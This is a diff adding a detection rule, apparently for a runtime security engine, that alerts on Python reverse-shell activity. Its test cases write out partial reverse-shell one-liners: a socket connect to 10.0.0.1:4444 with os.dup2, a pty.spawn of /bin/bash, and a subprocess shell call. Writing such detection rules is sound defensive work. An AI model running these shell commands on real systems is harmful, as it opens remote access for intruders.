@@ -1,0 +1,36 @@
+name: python_reverse_shell
+mode: alert
+eval: |
+  (
+    (e.process_name == "python" || e.process_name == "python3" || e.process_name == "python2") &&
+    (
+      re_match(e.process_args, "import\\s+socket") ||
+      re_match(e.process_args, "import\\s+subprocess") ||
+      re_match(e.process_args, "import\\s+pty") ||
+      re_match(e.process_args, "socket\\.socket") ||
+      re_match(e.process_args, "pty\\.spawn") ||
+      re_match(e.process_args, "os\\.dup2") ||
+      re_match(e.process_args, "subprocess\\.call.*shell")
+    )
+  )
+tests:
+  - cleartext: "python3 -c 'import socket,subprocess,os;...'"
+    process_name: python3
+    process_args: "python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)"
+    should_match: true
+  - cleartext: "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    process_name: python
+    process_args: "python -c import pty; pty.spawn(\"/bin/bash\")"
+    should_match: true
+  - cleartext: "python3 -c 'import subprocess; subprocess.call([\"/bin/sh\"], shell=True)'"
+    process_name: python3
+    process_args: "python3 -c import subprocess; subprocess.call([\"/bin/sh\"], shell=True)"
+    should_match: true
+  - cleartext: "python3 script.py (benign)"
+    process_name: python3
+    process_args: "python3 script.py"
+    should_match: false
+  - cleartext: "python3 -c 'print(hello)'"
+    process_name: python3
+    process_args: "python3 -c print(hello)"
+    should_match: false
